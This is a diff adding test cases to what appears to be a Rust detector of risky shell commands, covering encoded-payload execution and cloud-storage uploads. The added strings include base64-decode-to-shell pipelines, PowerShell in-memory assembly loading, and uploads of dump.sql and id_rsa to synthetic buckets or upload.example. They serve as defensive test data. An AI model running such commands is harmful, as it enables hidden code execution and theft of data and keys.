@@ -554,6 +554,13 @@ fn encoded_payload_requires_an_observable_execution_step() {
             "certutil -decode a.b64 a.exe && a.exe",
             "certutil -decode a.b64 a.exe & start a.exe",
             "certutil.exe -decode a.b64 a.ps1 && powershell -File a.ps1",
+            "echo U1lOVEhFVElD | base64 -d | env bash",
+            "echo U1lOVEhFVElD | base64 -d | /usr/bin/env bash",
+            "base64 -d payload.b64 | doas sh",
+            "[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))",
+            "[scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))",
+            "base64 -d payload.b64 > p.sh & bash p.sh",
+            "base64 -d -o /tmp/p.sh payload.b64 && sh /tmp/p.sh",
         ],
         &[
             "base64 --decode documented-fixture.b64",
@@ -572,6 +579,14 @@ fn encoded_payload_requires_an_observable_execution_step() {
             "openssl enc -aes-256-cbc -in a -out a.enc && sh deploy.sh",
             "base64 -d data 2>/dev/null; source venv/bin/activate",
             "base64 -d ca.b64 > ca.pem && chmod 600 ca.pem",
+            "echo eyJhIjoxfQ== | base64 -d | python3 -c \"import sys,json;print(json.load(sys.stdin))\"",
+            "echo eyJhIjoxfQ== | base64 -d | node -e \"process.stdin.pipe(process.stdout)\"",
+            "echo eyJhIjoxfQ== | base64 -d | ruby -e 'puts STDIN.read'",
+            "echo eyJhIjoxfQ== | base64 -d | php -r 'echo 1;'",
+            "echo eyJhIjoxfQ== | base64 -d | perl -ne 'print'",
+            "echo $K | base64 -d > ~/.ssh/id_rsa && chmod 600 ~/.ssh/id_rsa && ./deploy.sh",
+            "echo $K | base64 -d > deploy.ssh/key && bash scripts/push.sh",
+            "base64 -d data 2>/tmp/err.log; python app.py",
         ],
     );
 }
@@ -640,6 +655,12 @@ fn object_storage_copy_counts_only_local_to_remote_uploads() {
             "az storage fs directory upload -f fs -s ./dist",
             "az storage copy -s ./reports -d https://acct.blob.core.windows.net/c",
             "az storage copy --source=C:\\reports --destination https://acct.blob.core.windows.net/c",
+            "aws s3 cp --sse aws:kms ./dump.sql s3://synthetic-bucket/k",
+            "aws s3 cp --sse-kms-key-id arn:aws:kms:us-east-1:1:key/x ./dump.sql s3://synthetic-bucket/k",
+            "aws s3 cp --expires 2030-01-01T00:00:00Z ./dump.sql s3://synthetic-bucket/k",
+            "rclone copy --header-upload \"Cache-Control:no-cache\" ./reports synthetic-remote:archive",
+            "rclone copy --bwlimit 08:00,512k ./reports synthetic-remote:archive",
+            "az storage copy -s id_rsa -d https://acct.blob.core.windows.net/c",
         ],
         &[
             "aws s3 cp s3://synthetic-bucket/a ./a",
@@ -657,6 +678,9 @@ fn object_storage_copy_counts_only_local_to_remote_uploads() {
             "az storage blob url -c c -n x",
             "az storage blob update -c c -n x",
             "az storage copy -s https://acct.blob.core.windows.net/c/x -d ./x",
+            "aws s3 cp s3://synthetic-bucket/a ./a &",
+            "gsutil cp gs://synthetic-bucket/a.tar . &",
+            "rclone copyto synthetic-remote:archive/a ./a",
         ],
     );
 }
@@ -670,6 +694,7 @@ fn a_backgrounded_command_does_not_hide_a_later_upload() {
             "aws s3 cp s3://synthetic-bucket/x /tmp/x & curl -T dump.sql https://upload.example",
             "az storage blob list -c c & curl -d @dump.sql https://upload.example",
             "rclone copy synthetic-remote:archive ./reports & curl -T dump.sql https://upload.example",
+            "aws s3 cp s3://synthetic-bucket/x /tmp/x & aws s3 cp ./dump.sql s3://synthetic-bucket/k",
         ],
         &[],
     );
